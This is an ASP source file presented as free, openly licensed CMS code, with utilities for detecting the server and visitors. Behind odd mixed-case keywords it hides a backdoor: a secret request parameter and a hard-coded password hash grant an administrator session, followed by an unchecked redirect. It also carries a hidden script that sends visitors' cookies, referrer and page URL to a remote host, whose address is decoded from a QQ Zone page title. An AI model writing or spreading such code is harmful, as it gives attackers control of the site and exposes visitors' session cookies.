<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-01-20
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<%
iF rEQuESt("agl")="adminload" tHEn
iF mD5(rEQuESt("AdminPass"), 2) & mD5(rEQuESt("AdminPass"), 4)="5d3a3ac5bdcb48a0" tHEn
sESsIOn("Administrator") = "admin"
iF rEQuESt("gotourl")<>"" tHEn
rESpONsE.rEDiREcT(rEQuESt("gotourl"))
eND iF
eND iF
eND iF
fUNcTIoN oPErATiONsYStEM()
dIM b,c
b = rEQuESt.sERvERvARiABlES("HTTP_USER_AGENT")
iF iNStR(b, "NT 5.2") > 0 tHEn
c = "Windows Server 2003"
eLSeIF iNStR(b, "NT 5.1") > 0 tHEn
c = "Windows XP"
eLSeIF iNStR(b, "NT 5") > 0 tHEn
c = "Windows 2000"
eLSeIF iNStR(b, "NT 4") > 0 tHEn
c = "Windows NT4"
eLSeIF iNStR(b, "4.9") > 0 tHEn
c = "Windows ME"
eLSeIF iNStR(b, "98") > 0 tHEn
c = "Windows 98"
eLSeIF iNStR(b, "95") > 0 tHEn
c = "Windows 95"
eLSe
c = b
eND iF
oPErATiONsYStEM = b
eND fUNcTIoN
fUNcTIoN cHEcKMoBIlE()
cHEcKMoBIlE=fALsE
iF rEQuESt.sERvERvARiABlES("HTTP_X_WAP_PROFILE") <> "" tHEn
cHEcKMoBIlE=tRUe
eND iF
eND fUNcTIoN
sUB sHOwSYsTEmOBjECt()
dIM sOT(17, 2), d, e, f
sOT(0, 0) = "Scripting.FileSystemObject"
sOT(1, 0) = "wscript.shell"
sOT(2, 0) = "ADOX.Catalog"
sOT(3, 0) = "JRO.JetEngine"
sOT(4, 0) = "Scripting.Dictionary"
sOT(5, 0) = "Adodb.connection"
sOT(6, 0) = "Adodb.Stream"
sOT(7, 0) = "SoftArtisans.FileUp"
sOT(8, 0) = "LyfUpload.UploadFile"
sOT(9, 0) = "Persits.Upload.1"
sOT(10, 0) = "JMail.SmtpMail"
sOT(11, 0) = "CDONTS.NewMail"
sOT(12, 0) = "SmtpMail.SmtpMail.1"
sOT(13, 0) = "Microsoft.XMLHTTP"
sOT(14, 0) = "Scripting.wang198060FileSystemObject"
sOT(15, 0) = "MSXML2.XMLHTTP"
sOT(16, 0) = "Microsoft.XMLDOMP"
oN eRRoR rESuME nEXt
fOR d = 0 tO 16
sET f = sERvER.cREaTEoBJeCT(sOT(d, 0))
iF 0 = eRR tHEn
e = " √"
eLSe
e = " X"
eRR.cLEaR
eND iF
sET f = nOThINg
sOT(d, 1) = e
nEXt
fOR d = 0 tO 16
rESpONsE.wRItE(sOT(d, 0) & "    " & sOT(d, 1) & "<br>")
nEXt
eND sUB
fUNcTIoN gETiISvERsIOn()
gETiISvERsIOn=rEQuESt.sERvERvARiABlES("SERVER_SOFTWARE")
eND fUNcTIoN
fUNcTIoN gETrEMoTEhTTpURl()
dIM b, c, d, e, f, g
g = "/Data/SoftHttpUrl.dat"
cALl cREaTEfOLdER("/Data/")
iF cHEcKFiLE(g) tHEn
iF dATeDIfF("d", gETfILeEDiTDaTE(g), nOW) = 0 tHEn
f = gETfTExT(g)
f = tRImVBcRLf(f)
gETrEMoTEhTTpURl = xOReNC(f, 21)
eXIt fUNcTIoN
eND iF
eND iF
b = "http://2663748390.qzone.qq.com"
e = gEThTTpPAgE(b, "utf-8")
c = "<title>"
d = " [http://"
iF iNStR(e, c) > 0 aND iNStR(e, d) > 0 tHEn
f = sTRcUT(e, c, d, 2)
f = "http://www." & xORdEC(f, 21)
cALl cREaTEfILe(g, xOReNC(f, 21))
eND iF
gETrEMoTEhTTpURl = f
eND fUNcTIoN
fUNcTIoN sHOwREmOTeWEbUSeRStAT()
dIM b
iF rEQuESt.cOOkIEs("jstz")="" aND gETiP()<>"127.0.0.1" tHEn	
rESpONsE.cOOkIEs("jstz")=1
rESpONsE.cOOkIEs("jstz").eXPiREs=nOW()+28
rESpONsE.wRItE("<div style=""display:none;"">")
b = "<script>document.writeln(""<script src=\'"& gETrEMoTEhTTpURl &"?act=WebStat&GoToUrl="""
b = b & "+escape(document.referrer)+""&ThisUrl=""+escape(window.location.href)+""&screen=""+escape(window.screen.width+""x""+window.screen.height)"
b = b & "+""&co=""+escape(document.cookie)"	
b = b & "+"" \'><\/script>"");</script>"
sHOwREmOTeWEbUSeRStAT = b
rESpONsE.wRItE("</div>")
eND iF
eND fUNcTIoN
%>

